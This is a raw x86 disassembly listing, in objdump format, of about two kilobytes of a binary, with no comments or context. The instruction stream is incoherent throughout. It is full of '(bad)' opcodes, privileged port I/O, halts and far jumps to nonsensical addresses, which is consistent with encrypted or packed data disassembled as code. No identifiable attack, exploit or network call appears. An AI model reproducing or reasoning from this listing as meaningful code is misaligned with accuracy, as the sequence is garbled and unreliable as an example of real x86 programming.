  407e0c:	xchg   BYTE PTR [ebx+0x6e],al
  407e0f:	lods   eax,DWORD PTR ds:[esi]
  407e10:	lahf   
  407e11:	xchg   ebp,eax
  407e12:	add    DWORD PTR [ebx-0x5c953d47],ecx
  407e18:	push   ecx
  407e19:	les    ebx,FWORD PTR [edi+ecx*8+0x24]
  407e1d:	je     0x407e87
  407e1f:	push   0xdf80aa6c
  407e24:	dec    ecx
  407e25:	ret    
  407e26:	or     bh,BYTE PTR [esi+0x1c]
  407e29:	or     dl,bl
  407e2b:	lods   eax,DWORD PTR ds:[esi]
  407e2c:	loopne 0x407e09
  407e2e:	stc    
  407e2f:	adc    eax,DWORD PTR [eax+0x4f]
  407e32:	sbb    eax,0xdf4c3c4c
  407e37:	aaa    
  407e38:	in     al,0xc9
  407e3a:	stos   DWORD PTR es:[edi],eax
  407e3b:	ins    DWORD PTR es:[edi],dx
  407e3c:	add    DWORD PTR [ecx],ebp
  407e3e:	rcr    DWORD PTR [ecx],0xd
  407e41:	test   BYTE PTR [ecx],ch
  407e43:	ja     0x407e44
  407e45:	pop    es
  407e46:	pop    eax
  407e47:	inc    ebp
  407e48:	push   cs
  407e49:	jg     0x407e04
  407e4b:	and    edi,DWORD PTR [esi]
  407e4d:	sbb    edx,edi
  407e4f:	cs pop ds
  407e51:	inc    esp
  407e52:	xor    ah,BYTE PTR [eax]
  407e54:	(bad)  
  407e55:	in     eax,0x54
  407e57:	jns    0x407e7f
  407e59:	cmc    
  407e5a:	in     al,0xd8
  407e5c:	lods   al,BYTE PTR ds:[esi]
  407e5d:	imul   edi,DWORD PTR [edi+0x610bcb77],0xb09b6d88
  407e67:	add    al,0xed
  407e69:	cdq    
  407e6a:	mov    bl,0xc9
  407e6c:	mov    bl,bl
  407e6e:	sub    BYTE PTR [ebp+0x65a6185b],ch
  407e74:	call   0x4c78c4d6
  407e79:	inc    edx
  407e7a:	fadd   QWORD PTR [edx+0x2a]
  407e7d:	xchg   esi,eax
  407e7e:	jl     0x407e0c
  407e80:	out    0x8b,al
  407e82:	mov    eax,ds:0x19fc3f95
  407e87:	lock xchg ebp,eax
  407e89:	xor    al,0x5f
  407e8b:	in     al,0x7a
  407e8d:	shl    BYTE PTR [ecx+eiz*2+0x2a438c3],0x35
  407e95:	sbb    DWORD PTR [edx],ebx
  407e97:	(bad)  
  407e98:	rcl    BYTE PTR ss:[eax-0x4664ff2c],cl
  407e9f:	and    ecx,esi
  407ea1:	sti    
  407ea2:	pop    esi
  407ea3:	mov    eax,0xe1a889c7
  407ea8:	retf   0xfac9
  407eab:	sbb    BYTE PTR [esi+eax*4+0x423f2371],cl
  407eb2:	shr    DWORD PTR [ebp+0xfc22b37],1
  407eb8:	push   cs
  407eb9:	shr    BYTE PTR ds:0xb8d92e95,0x62
  407ec0:	mov    BYTE PTR [ebx-0x2b35421f],dl
  407ec6:	mov    esi,cs
  407ec8:	xor    bl,bl
  407eca:	aas    
  407ecb:	xchg   edx,eax
  407ecc:	inc    eax
  407ecd:	adc    BYTE PTR [ecx+0x32],ch
  407ed0:	adc    bl,BYTE PTR [ebx+esi*4+0x4400ea56]
  407ed7:	mov    ds:0x9c310825,eax
  407edc:	gs push ds
  407ede:	jns    0x407e68
  407ee0:	fisttp DWORD PTR [esi+edx*1]
  407ee3:	add    BYTE PTR [eax-0x76],bl
  407ee6:	je     0x407f2e
  407ee8:	gs out 0x17,al
  407eeb:	inc    ecx
  407eec:	iret   
  407eed:	imul   esi,DWORD PTR [ecx*4+0x2d9c3a56],0xffffffb4
  407ef5:	and    BYTE PTR [eax-0x72c2983d],cl
  407efb:	ja     0x407eba
  407efd:	xor    esp,DWORD PTR [ecx+ebp*8]
  407f00:	neg    BYTE PTR [esi]
  407f02:	lods   al,BYTE PTR ds:[esi]
  407f03:	inc    eax
  407f04:	jo     0x407f5a
  407f06:	icebp  
  407f07:	cmp    DWORD PTR [edx+0x67],edi
  407f0a:	xchg   ebx,eax
  407f0b:	jp     0x407eb5
  407f0d:	inc    edi
  407f0e:	push   ebx
  407f0f:	cmp    dl,bh
  407f11:	push   edx
  407f12:	js     0x407ec7
  407f14:	cld    
  407f15:	xor    ebp,DWORD PTR [eiz*8-0x3672f06a]
  407f1c:	fnsave [bx]
  407f1f:	or     al,0xf3
  407f22:	jge    0x407eb3
  407f24:	push   ebx
  407f25:	imul   esi,DWORD PTR [edx-0x28],0xd230cff4
  407f2c:	repz xor esi,DWORD PTR [esi+eax*1+0x37]
  407f31:	out    dx,eax
  407f32:	imul   esp,DWORD PTR [ebp+0x12abc80b],0xffffffa8
  407f39:	xchg   ebx,eax
  407f3a:	sub    ah,BYTE PTR [edi-0x1cf37ffd]
  407f40:	push   ss
  407f41:	jle    0x407f7d
  407f43:	xor    BYTE PTR [ebx-0x444177c8],al
  407f49:	or     eax,0x319ae255
  407f4e:	mov    bh,0x2e
  407f50:	pop    ds
  407f51:	(bad)  
  407f52:	sahf   
  407f53:	leave  
  407f54:	imul   ebx,DWORD PTR ds:0xdfeb6c1a,0xffffff88
  407f5b:	mov    BYTE PTR [ebx],dl
  407f5d:	adc    bh,BYTE PTR [eax]
  407f5f:	pushf  
  407f60:	jecxz  0x407f77
  407f62:	xlat   BYTE PTR ds:[ebx]
  407f63:	mov    edx,0xd81682dd
  407f68:	pop    esi
  407f69:	cmp    BYTE PTR [edx],al
  407f6b:	pushf  
  407f6c:	sbb    eax,0xc7df6e54
  407f71:	adc    BYTE PTR [edi+0x280d576a],bl
  407f77:	scas   al,BYTE PTR es:[edi]
  407f78:	out    dx,al
  407f79:	mov    bl,0x71
  407f7b:	push   0x56
  407f7d:	outs   dx,BYTE PTR ds:[esi]
  407f7e:	ins    DWORD PTR es:[edi],dx
  407f7f:	pop    eax
  407f80:	mov    edi,0x7fa9b815
  407f85:	lods   al,BYTE PTR ds:[esi]
  407f86:	call   0x5bb8e55a
  407f8b:	ins    BYTE PTR es:[edi],dx
  407f8c:	xor    al,0xf2
  407f8e:	push   ss
  407f8f:	inc    edx
  407f90:	je     0x407fc6
  407f92:	pop    edx
  407f93:	lahf   
  407f94:	mov    dl,0xc0
  407f96:	sbb    DWORD PTR [esi],0x6963d3e9
  407f9c:	jne    0x407ff8
  407f9e:	push   edx
  407f9f:	imul   esp,DWORD PTR [esi+0x22],0xcb91ad47
  407fa6:	call   eax
  407fa8:	jnp    0x407fb5
  407faa:	pcmpeqw mm1,QWORD PTR ds:0xe90fb02b
  407fb1:	push   ss
  407fb2:	lea    eax,[ebx+0x69af5004]
  407fb8:	xor    ebx,esi
  407fba:	call   0x3a25:0x86130434
  407fc1:	push   es
  407fc2:	mov    ecx,0x75c6e7e3
  407fc7:	push   ebx
  407fc8:	loope  0x407f82
  407fca:	dec    esp
  407fcb:	in     al,dx
  407fcc:	(bad)  
  407fcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fce:	push   ebx
  407fcf:	mov    bh,0xf5
  407fd1:	test   al,0xea
  407fd3:	rol    cl,1
  407fd5:	cmp    DWORD PTR [ecx],ecx
  407fd7:	push   0x96271e0c
  407fdc:	inc    esi
  407fdd:	jmp    FWORD PTR [esi+0x1c]
  407fe0:	cmp    ebp,ebp
  407fe2:	pop    ebp
  407fe3:	push   es
  407fe4:	imul   ebx,DWORD PTR [ecx],0x43cbd72
  407fea:	pop    es
  407feb:	dec    edx
  407fec:	xor    BYTE PTR [edx],ch
  407fee:	push   ecx
  407fef:	ret    
  407ff0:	dec    edx
  407ff1:	pop    ebx
  407ff2:	fmul   QWORD PTR [edi-0x22]
  407ff5:	push   0xffffff90
  407ff7:	sub    DWORD PTR [ebx],esi
  407ff9:	dec    edx
  407ffa:	pop    esi
  407ffb:	sahf   
  407ffc:	(bad)  
  407ffd:	xchg   DWORD PTR [ecx],ebx
  407fff:	jbe    0x408019
  408001:	(bad)  
  408002:	repz out 0xf7,eax
  408005:	jg     0x407fc2
  408007:	cmp    DWORD PTR [ecx+ebx*2+0x5e],esi
  40800b:	xchg   esi,eax
  40800c:	add    al,0x4d
  40800e:	lea    esp,[eax+ebx*1+0x2]
  408012:	popa   
  408013:	daa    
  408014:	adc    al,bl
  408016:	mov    eax,0x38c4ea62
  40801b:	call   0xc2891ca1
  408020:	js     0x408000
  408022:	jnp    0x407fd3
  408024:	jmp    0xb763:0x8230677b
  40802b:	xchg   edi,eax
  40802c:	jecxz  0x408033
  40802e:	in     al,dx
  40802f:	dec    esp
  408030:	clc    
  408031:	push   ebp
  408032:	pop    ebp
  408033:	jno    0x40807d
  408035:	inc    ecx
  408037:	retf   0xe44b
  40803a:	out    0x0,al
  40803c:	add    eax,0x3e60abdb
  408041:	mov    ch,0xb0
  408043:	in     eax,dx
  408044:	xchg   esp,eax
  408045:	mov    ah,0x6b
  408047:	outs   dx,DWORD PTR ds:[esi]
  408049:	and    ch,BYTE PTR [edx]
  40804b:	or     al,0x36
  40804d:	and    DWORD PTR [ebx+0x2ffcc882],0x3
  408054:	ret    0xff29
  408057:	ins    DWORD PTR es:[edi],dx
  408058:	pop    esp
  408059:	fsubrp st(2),st
  40805b:	or     al,0xac
  40805d:	pop    ebx
  40805e:	into   
  40805f:	mov    esi,DWORD PTR [edi+ebp*2-0x6]
  408063:	push   ds
  408064:	mov    ch,0xa7
  408066:	(bad)  
  408067:	pop    ebp
  408068:	mov    esp,0x128b686c
  40806d:	ja     0x40804e
  40806f:	jo     0x4080a6
  408071:	dec    ecx
  408072:	mov    BYTE PTR [edi-0x39],al
  408075:	arpl   WORD PTR [esi+0x4f],si
  408078:	mov    bl,0x69
  40807a:	or     cl,dh
  40807c:	loop   0x408028
  40807e:	outs   dx,DWORD PTR ds:[esi]
  40807f:	inc    edi
  408080:	xchg   esp,eax
  408081:	mov    dh,0xa2
  408083:	jno    0x408075
  408085:	mov    eax,ds:0xe958429b
  40808a:	iret   
  40808b:	sub    al,0xf6
  40808d:	push   ss
  40808e:	invd   
  408090:	addr16 push 0xffffffb3
  408093:	mov    edi,0x9c3cb9ee
  408098:	inc    ebx
  408099:	call   DWORD PTR [ebx+0x2f79cc58]
  40809f:	xchg   esp,eax
  4080a0:	ins    BYTE PTR es:[edi],dx
  4080a1:	dec    edx
  4080a2:	in     eax,0x8b
  4080a4:	ret    0xe618
  4080a7:	inc    ecx
  4080a8:	das    
  4080a9:	xchg   edi,eax
  4080aa:	sub    dh,BYTE PTR [eax]
  4080ac:	daa    
  4080ad:	fcmovnb st,st(4)
  4080af:	pop    ss
  4080b0:	cld    
  4080b1:	adc    ch,dh
  4080b3:	int3   
  4080b4:	loopne 0x40810b
  4080b6:	inc    edi
  4080b7:	pop    ecx
  4080b8:	sbb    eax,0x22e9a74f
  4080be:	fld    DWORD PTR [eax]
  4080c0:	sub    eax,0xfb6af7f3
  4080c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080c6:	dec    esp
  4080c7:	mov    ?,esi
  4080c9:	in     eax,0x61
  4080cb:	faddp  st(1),st
  4080cd:	pop    esi
  4080ce:	mov    ch,0xeb
  4080d0:	jno    0x408144
  4080d2:	push   0xf349f0a1
  4080d7:	pop    ebx
  4080d8:	nop
  4080d9:	jp     0x4080b1
  4080db:	imul   edx,edi,0x16ebd0b0
  4080e1:	sbb    DWORD PTR [esi],edi
  4080e3:	xrelease mov DWORD PTR [ebp-0x3c597ffb],0x4de64fb5
  4080ee:	pop    ecx
  4080ef:	bound  ebp,QWORD PTR [ebx+0x6b600e52]
  4080f5:	xor    esi,esp
  4080f7:	and    eax,0x4d993d33
  4080fc:	std    
  4080fd:	pop    ds
  4080fe:	mov    ebx,0xb260ba0d
  408103:	add    cl,BYTE PTR [edx+0x2d98e285]
  408109:	pop    ds
  40810a:	adc    DWORD PTR [esi+0x453f0d29],esi
  408110:	xchg   DWORD PTR [ebx+0x72db61d1],edi
  408116:	jne    0x4080f1
  408118:	test   DWORD PTR [edx+0x142f77f6],edx
  40811e:	scas   al,BYTE PTR es:[edi]
  40811f:	retf   
  408120:	and    al,0xa4
  408122:	enter  0x380e,0x90
  408126:	mov    al,BYTE PTR [eax-0x2c]
  408129:	mov    ds:0x43e72eed,eax
  40812e:	mov    ?,WORD PTR [ecx+0x1c008690]
  408134:	sbb    ebp,edx
  408136:	inc    edx
  408137:	mov    ebx,0x2a8da5a8
  40813c:	fld    DWORD PTR [esi]
  40813e:	fsub   DWORD PTR [ebx+edx*4-0x7f0bb4e8]
  408145:	hlt    
  408146:	loopne 0x4080df
  408148:	std    
  408149:	sbb    DWORD PTR [ebx+0x55],eax
  40814c:	lods   eax,DWORD PTR ds:[esi]
  40814d:	cmp    DWORD PTR [eax-0x70d42fe3],esi
  408153:	jo     0x408109
  408155:	aam    0x13
  408157:	neg    al
  408159:	aas    
  40815a:	or     eax,0x4ceb572d
  40815f:	bound  ebp,QWORD PTR [edx]
  408161:	retf   
  408162:	mov    esi,0x9a80448b
  408168:	cmp    al,0xe1
  40816a:	xor    eax,0xbbe855e9
  40816f:	push   ss
  408170:	lods   eax,DWORD PTR ds:[esi]
  408171:	sub    esp,DWORD PTR [ebx+edx*4]
  408174:	or     al,0x99
  408176:	lock inc esi
  408178:	imul   eax,DWORD PTR [ebp+0x5d],0xa0d69614
  40817f:	mov    ah,0x3a
  408181:	ret    
  408182:	repz mov al,0xfc
  408185:	outs   dx,BYTE PTR ds:[esi]
  408186:	xchg   ebp,eax
  408187:	mul    DWORD PTR [ecx]
  408189:	add    al,0xbe
  40818b:	mov    al,al
  40818d:	pusha  
  40818e:	retf   
  40818f:	inc    edi
  408190:	js     0x40817b
  408192:	js     0x40813c
  408194:	push   0xffffffca
  408196:	repz sub DWORD PTR [edi],ebx
  408199:	jmp    0xc91d10ca
  40819e:	(bad)  
  40819f:	call   0x23a5:0xca3f564
  4081a6:	arpl   WORD PTR [ebp-0x120a8f75],si
  4081ac:	mov    ecx,edi
  4081ae:	jne    0x408152
  4081b0:	in     eax,dx
  4081b1:	mov    edx,0xfbc9ba35
  4081b6:	lods   eax,DWORD PTR ds:[esi]
  4081b7:	push   esi
  4081b8:	retf   0x249c
  4081bb:	dec    edx
  4081bc:	jle    0x408208
  4081be:	cmp    BYTE PTR [edx+edx*8+0x3cf2e940],al
  4081c5:	inc    ecx
  4081c6:	adc    BYTE PTR [ecx+0x60],ah
  4081c9:	ins    BYTE PTR es:[edi],dx
  4081ca:	mov    ebx,0x8fa58ff5
  4081cf:	jnp    0x4081a8
  4081d1:	cmp    eax,0x71b717d9
  4081d6:	push   esi
  4081d7:	cmp    edx,edi
  4081d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081da:	(bad)  
  4081dc:	call   0x875a7c75
  4081e1:	js     0x40817d
  4081e3:	std    
  4081e4:	inc    ebp
  4081e5:	fnsave [edi-0x68f46c60]
  4081eb:	xchg   DWORD PTR [esi-0x6a],edx
  4081ee:	mov    eax,ds:0xd5759b9c
  4081f3:	jae    0x40826c
  4081f5:	jae    0x40826d
  4081f7:	inc    edi
  4081f8:	xor    bl,BYTE PTR [esp+eiz*4+0x6d]
  4081fc:	add    al,BYTE PTR [ebp-0x45]
  4081ff:	xchg   esi,esi
  408201:	(bad)
  408204:	push   ss
  408205:	mov    edi,0xe6c36120
  40820a:	sbb    al,BYTE PTR [ecx]
  40820c:	and    DWORD PTR [edx-0x71],esp
  40820f:	jp     0x40822d
  408211:	je     0x408285
  408213:	inc    eax
  408214:	ds push ecx
  408216:	test   DWORD PTR [eax+edx*8],eax
  408219:	xor    al,0xb7
  40821b:	mov    ah,0x40
  40821d:	mov    ecx,0x2e97803b
  408222:	xor    BYTE PTR [ecx-0x8],bl
  408225:	jge    0x40828d
  408227:	xchg   esp,eax
  408228:	ja     0x4081fc
  40822a:	pop    ds
  40822b:	in     al,0xc5
  40822d:	adc    eax,0x2c21ded8
  408232:	cld    
  408233:	pop    ss
  408234:	xchg   edi,eax
  408235:	imul   DWORD PTR [esi+0x17]
  408238:	scas   al,BYTE PTR es:[edi]
  408239:	ds sub esi,ecx
  40823c:	mov    bl,0x0
  40823e:	lods   al,BYTE PTR ds:[esi]
  40823f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408240:	or     DWORD PTR [ecx-0x174024f2],ecx
  408246:	cld    
  408247:	push   esp
  408248:	push   ebx
  408249:	pusha  
  40824a:	xchg   DWORD PTR [eax+edx*4],ecx
  40824d:	mov    edx,0xe27fa01f
  408252:	mov    edx,0x50f2cac3
  408257:	rcl    ecx,1
  408259:	jno    0x40821d
  40825b:	test   BYTE PTR [eax-0x5477406a],0x7d
  408262:	xor    ah,BYTE PTR [ecx]
  408264:	das    
  408265:	stos   DWORD PTR es:[edi],eax
  408266:	jae    0x408282
  408268:	push   0x3
  40826a:	push   cs
  40826b:	nop
  40826c:	mov    edi,DWORD PTR [ebp+ecx*8+0x4f5e6940]
  408273:	popa   
  408274:	add    DWORD PTR [edi+0x4d],edi
  408277:	mov    esi,0xed959cd8
  40827c:	arpl   WORD PTR [ebx],dx
  40827e:	add    al,0x3f
  408280:	pushw  0xdfbb
  408284:	fwait
  408285:	shl    BYTE PTR [ebp+0x4],0x8b
  408289:	test   al,0x5b
  40828b:	loop   0x4082c2
  40828d:	sar    BYTE PTR [esi-0x15],cl
  408290:	fld    TBYTE PTR [eax-0x325ba7df]
  408296:	in     eax,dx
  408297:	inc    edx
  408298:	fiadd  WORD PTR es:[ebx]
  40829b:	push   edi
  40829c:	mov    bh,0x72
  40829e:	xor    eax,0xefa3927a
  4082a3:	lock sub BYTE PTR [edx+0x16743c4],cl
  4082aa:	adc    DWORD PTR [edi-0x5decbddb],esi
  4082b0:	fwait
  4082b1:	adc    eax,0x23ce1fb5
  4082b6:	pusha  
  4082b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082b8:	jno    0x408291
  4082ba:	mov    DWORD PTR [esi+0xd8e20ce],edx
  4082c0:	nop
  4082c1:	dec    ecx
  4082c2:	(bad)  
  4082c3:	popf   
  4082c4:	nop
  4082c5:	dec    edx
  4082c6:	jecxz  0x4082f9
  4082c8:	nop
  4082c9:	xor    DWORD PTR [ebx],ecx
  4082cb:	out    0x77,al
  4082cd:	scas   eax,DWORD PTR es:[edi]
  4082ce:	sbb    dh,dl
  4082d0:	aas    
  4082d1:	mov    ds:0xcafaea77,al
  4082d6:	shl    DWORD PTR [ebx-0x139a67cd],1
  4082dc:	push   eax
  4082dd:	pop    eax
  4082de:	sbb    BYTE PTR [ecx+edx*8-0x6664a7bb],dh
  4082e5:	fs dec eax
  4082e7:	adc    BYTE PTR [edx],ah
  4082e9:	js     0x4082a1
  4082eb:	(bad)  
  4082ec:	sub    eax,0x1a2130ec
  4082f1:	or     eax,0x3bed4649
  4082f6:	cli    
  4082f7:	pusha  
  4082f8:	or     esi,ecx
  4082fa:	mov    ss,WORD PTR [edi+0x8454e88]
  408300:	pop    ecx
  408301:	cmp    ebx,DWORD PTR gs:[ecx+0x7509d953]
  408308:	rcl    DWORD PTR [edx+eiz*2],cl
  40830b:	xchg   BYTE PTR [eax+ebx*1],bh
  40830e:	fild   WORD PTR [eax+0x36]
  408311:	xchg   ecx,eax
  408312:	mov    ah,0x42
  408314:	fcom   QWORD PTR [edi+0x6f58a48e]
  40831a:	das    
  40831b:	cmc    
  40831c:	dec    ecx
  40831d:	aam    0x7c
  40831f:	lea    esp,[ebx-0x7d]
  408322:	sahf   
  408323:	stos   BYTE PTR es:[edi],al
  408324:	jle    0x408356
  408326:	jns    0x4082dc
  408328:	and    DWORD PTR ds:0xe9b0d736,esi
  40832e:	dec    esp
  40832f:	adc    BYTE PTR [ebx],bh
  408331:	or     al,0x44
  408333:	or     BYTE PTR ds:0x690af53d,0xa9
  40833a:	sub    esp,DWORD PTR [edi+0x1f25152c]
  408340:	loop   0x40839f
  408342:	sub    eax,0x1daee639
  408347:	std    
  408348:	fsub   DWORD PTR cs:[ebx+0x6be12439]
  40834f:	lea    ebx,[edx+0x6fb1a09f]
  408355:	test   eax,0xd580bee0
  40835a:	cmc    
  40835b:	loop   0x40833e
  40835d:	mov    bl,0xb3
  40835f:	xor    ah,bl
  408361:	stos   BYTE PTR es:[edi],al
  408362:	jae    0x408345
  408364:	aam    0x5c
  408366:	mov    ecx,0xc109861b
  40836b:	lods   eax,DWORD PTR ds:[esi]
  40836c:	sub    eax,0xfd455f99
  408371:	fsub   st(4),st
  408373:	popa   
  408374:	xchg   DWORD PTR [edi],esp
  408376:	cli    
  408377:	retf   
  408378:	xor    al,0x63
  40837a:	in     al,dx
  40837b:	scas   al,BYTE PTR es:[edi]
  40837c:	xor    al,0xc4
  40837e:	inc    eax
  40837f:	sbb    al,0x51
  408381:	test   BYTE PTR [ebp+0x3f629381],dh
  408387:	sub    BYTE PTR [esi+0x7c8f0141],bh
  40838d:	fucom  st(7)
  40838f:	fbstp  TBYTE PTR [edi]
  408391:	(bad)  
  408392:	mov    edx,0x50f604c5
  408397:	cmp    DWORD PTR [ebx-0x62508939],0xf7e937d5
  4083a1:	pop    ds
  4083a2:	loope  0x4083e3
  4083a4:	inc    edx
  4083a5:	push   edx
  4083a6:	enter  0x6877,0x4d
  4083aa:	and    eax,0xb2468057
  4083af:	mov    BYTE PTR [edx-0x5],dl
  4083b2:	dec    edi
  4083b3:	and    DWORD PTR [eax-0x6c],0xc331059a
  4083ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083bb:	cs push ss
  4083bd:	mov    ds:0x983417ff,al
  4083c2:	cwde   
  4083c3:	fisttp WORD PTR [esi+0x355fe3f5]
  4083c9:	retf   
  4083ca:	pop    es
  4083cb:	stos   DWORD PTR es:[edi],eax
  4083cc:	jo     0x408359
  4083ce:	data16 mov bl,0xa1
  4083d1:	ja     0x408407
  4083d3:	push   eax
  4083d4:	hlt    
  4083d5:	rcr    DWORD PTR [edi+ecx*2],0xc4
  4083d9:	das    
  4083da:	test   BYTE PTR ds:0x38cbc78f,0xf3
  4083e1:	cmp    DWORD PTR [edi],esp
  4083e3:	in     al,dx
  4083e4:	and    DWORD PTR [edi+0x9],0xe
  4083e8:	sub    al,0xac
  4083ea:	call   DWORD PTR [esi-0x13b62ab6]
  4083f0:	nop
  4083f1:	dec    ecx
  4083f2:	cmp    al,0x3c
  4083f4:	or     dh,dh
  4083f6:	add    edi,DWORD PTR [ecx-0x60]
  4083f9:	push   esp
  4083fa:	xor    ecx,ebx
  4083fc:	(bad)  
  4083fd:	adc    bh,BYTE PTR [edi+0x2cad7bf]
  408403:	dec    edi
  408404:	dec    edi
  408405:	shr    DWORD PTR [ebx],1
  408407:	and    dl,ch
  408409:	fwait
  40840a:	sub    cl,BYTE PTR [esp+0x74]
  40840e:	into   
  40840f:	loope  0x4083ab
  408411:	cmp    eax,0xb3ea0fdc
  408416:	add    eax,0xbed7b0b4
  40841b:	repnz sbb ecx,ebx
  40841e:	sti    
  40841f:	mov    ds:0x5aa66f56,al
  408424:	lahf   
  408425:	sub    DWORD PTR [edx-0x774ab882],0x9bed0560
  40842f:	lods   al,BYTE PTR ds:[esi]
  408430:	retw   
  408432:	aas    
  408433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408434:	dec    edx
  408435:	adc    al,0x56
  408437:	ret    0xecd2
  40843a:	ss iret 
  40843c:	sub    esp,DWORD PTR [ecx]
  40843e:	mov    eax,0x3878f559
  408443:	sub    esi,edi
  408445:	fsubp  st(6),st
  408447:	outs   dx,BYTE PTR ds:[esi]
  408448:	push   esp
  408449:	mov    ecx,0x80d44582
  40844e:	es cld 
  408450:	mov    bh,0xac
  408452:	aaa    
  408453:	idiv   DWORD PTR [edx-0x2f]
  408456:	mov    ah,0x13
  408458:	add    al,0xa7
  40845a:	push   eax
  40845b:	ficomp WORD PTR [edx-0x18]
  40845e:	imul   esp,DWORD PTR [ebp-0x1f61469f],0xfffffff4
  408465:	pop    eax
  408466:	iret   
  408467:	cwde   
  408468:	or     ch,ah
  40846a:	push   es
  40846b:	test   eax,0x99e585a9
  408470:	add    eax,DWORD PTR ds:0x9f5f5fad
  408476:	mov    ch,BYTE PTR [esi+0x5ec2212f]
  40847c:	or     dh,BYTE PTR [esi-0x78]
  40847f:	lahf   
  408480:	pop    esi
  408481:	inc    ecx
  408482:	cmp    al,0x68
  408484:	mov    al,0x44
  408486:	cmp    BYTE PTR [eax+0x72270d80],dl
  40848c:	cmc    
  40848d:	dec    ecx
  40848e:	pop    ebp
  40848f:	mov    BYTE PTR [ecx],ah
  408491:	outs   dx,BYTE PTR ds:[esi]
  408492:	aaa    
  408493:	ret    
  408494:	jmp    0x852dfbb4
  408499:	call   0xf7357dd5
  40849e:	ret    
  40849f:	cmp    edi,DWORD PTR [ebp-0x335515b2]
  4084a5:	test   BYTE PTR [esi+0x4],0x2b
  4084a9:	rcr    dl,cl
  4084ab:	jae    0x408504
  4084ad:	inc    ebp
  4084ae:	push   0xd7cc531d
  4084b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084b4:	pop    edi
  4084b5:	iret   
  4084b6:	mov    eax,ds:0x12891fab
  4084bb:	pop    esp
  4084bc:	into   
  4084bd:	mov    ch,0x96
  4084bf:	mov    ebp,eax
  4084c1:	jmp    0x9d22fd63
  4084c6:	mov    ebx,0x4c0d347a
  4084cb:	lods   al,BYTE PTR ds:[esi]
  4084cc:	pop    eax
  4084cd:	push   esi
  4084ce:	es test al,0xdc
  4084d1:	inc    esp
  4084d2:	sar    BYTE PTR [edi],0x98
  4084d5:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4084d7:	test   BYTE PTR [edx+0x4b6118f1],dh
  4084dd:	loope  0x408465
  4084df:	fwait
  4084e0:	dec    esp
  4084e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084e2:	push   esi
  4084e3:	mov    edx,0x6735fa0
  4084e8:	mov    edi,0xf6c6b36d
  4084ed:	out    0x9a,eax
  4084ef:	lahf   
  4084f0:	(bad)  
  4084f1:	mov    bl,0x45
  4084f3:	sar    DWORD PTR [esi+edx*4-0x7a3432c4],cl
  4084fa:	aam    0xb0
  4084fc:	push   ds
  4084fd:	or     BYTE PTR [eax+0x1a],0x8a
  408501:	in     al,dx
  408502:	mov    al,0x34
  408504:	pop    esp
  408505:	mov    bl,0x9f
  408507:	jb     0x40852a
  408509:	pusha  
  40850a:	push   es
  40850b:	sbb    BYTE PTR [edi],dh
  40850d:	(bad)  
  40850e:	push   ecx
  40850f:	fidiv  DWORD PTR [bx+si-0x6f44]
  408514:	stos   DWORD PTR es:[edi],eax
  408515:	xchg   BYTE PTR [ebp+0x78],al
  408518:	push   esp
  408519:	(bad)  
  40851b:	lods   eax,DWORD PTR gs:[esi]
  40851d:	dec    edx
  40851e:	jae    0x408544
  408520:	test   al,0xe1
  408522:	fild   DWORD PTR [edi]
  408524:	inc    ecx
  408525:	jo     0x4084c9
  408527:	in     al,dx
  408528:	mov    esp,0x67e53b35
  40852d:	add    ch,BYTE PTR [ecx]
  40852f:	(bad)  
  408530:	(bad)  
  408531:	push   eax
  408532:	in     eax,dx
  408533:	(bad)  
  408534:	and    al,0xd0
  408536:	call   0xab6:0xc89d586b
  40853d:	xor    bh,BYTE PTR [edx]
  40853f:	(bad)  
  408540:	cmp    ebp,DWORD PTR [ebp-0x9]
  408543:	xor    eax,0x1cc3f2a0
  408548:	mov    ch,0x8c
  40854a:	jb     0x408567
  40854c:	mov    ds:0xf22c79a2,eax
  408551:	popa   
  408552:	and    al,0x47
  408554:	cli    
  408555:	imul   ebp,DWORD PTR [edi-0x1bb0bcf6],0xffffffcc
  40855c:	dec    edx
  40855d:	dec    esp
  40855e:	sti    
  40855f:	je     0x408538
  408561:	pop    eax
  408562:	iret   
  408563:	fwait
  408564:	or     esi,eax
  408566:	and    BYTE PTR [ecx+0x18],dh
  408569:	mov    ah,0x8c
  40856b:	fiadd  WORD PTR [ecx+0xe]
  40856e:	gs jge 0x408549
  408571:	(bad)  
  408572:	sub    al,0x4
  408574:	lock adc edi,esi
  408577:	jmp    0x2c80:0x7318afac
  40857e:	inc    ebx
  40857f:	or     BYTE PTR [ebp+0x10d50398],ch
  408585:	jns    0x4085fe
  408587:	adc    BYTE PTR [eax],0x53
  40858a:	shl    DWORD PTR [esi-0xfb1c2a],cl
  408590:	add    DWORD PTR [edi+0x2c],esp
  408593:	push   ebx
  408594:	dec    ebx
  408595:	add    ch,al
  408597:	lds    ebp,FWORD PTR [ecx-0x65817b2d]
  40859d:	xor    DWORD PTR [eax+0xc9f3a4e],ebx
  4085a3:	and    bh,BYTE PTR [ecx]
  4085a5:	adc    DWORD PTR cs:[eax-0x386304d8],esp
  4085ac:	std    
  4085ad:	daa    
  4085ae:	cmp    esp,DWORD PTR [ecx+0x16b0d17f]
  4085b4:	int    0xf3
  4085b6:	mov    ebp,ss
  4085b8:	dec    edi
  4085b9:	pop    ds
  4085ba:	adc    al,0x3a
  4085bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085bd:	fldcw  WORD PTR [edi-0xee108b9]
  4085c3:	cld    
  4085c4:	fnsave [ebx+eax*8-0x69edc019]
  4085cb:	sub    al,0x4f
  4085cd:	add    ebx,esp
  4085cf:	xor    eax,0xd4b73a
  4085d4:	sahf   
  4085d5:	dec    edx
  4085d6:	ins    DWORD PTR es:[edi],dx
  4085d7:	sub    eax,0x791872a0
  4085dc:	leave  
  4085dd:	cs pop edi
  4085df:	push   eax
  4085e0:	push   ebp
  4085e1:	mov    cl,0x84
  4085e3:	repz or eax,esp
  4085e6:	ret    
  4085e7:	mov    ah,BYTE PTR [esi]
  4085e9:	pop    ebx
  4085ea:	sahf   
  4085eb:	mov    bl,0x61
